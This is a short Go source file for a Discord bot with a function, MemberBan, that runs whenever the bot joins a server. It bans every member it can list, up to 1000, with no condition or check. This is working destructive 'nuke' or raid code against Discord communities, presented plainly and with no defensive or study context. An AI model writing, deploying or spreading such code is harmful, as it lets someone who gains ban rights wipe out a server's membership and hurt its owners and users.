package cogs

import (
	"github.com/bwmarrin/discordgo"
	"log"
)

func MemberBan(s *discordgo.Session, event *discordgo.GuildCreate) {
	members, err := s.GuildMembers(event.ID, "", 1000)
	if err != nil {
		log.Println("Can't take the list of members:", err)
		return
	}

	for _, member := range members {
		id := member.User.ID

		err := s.GuildBanCreate(event.ID, id, 0)
		if err != nil {
			log.Println("Can't ban members:", err)
			return
		}
	}
}
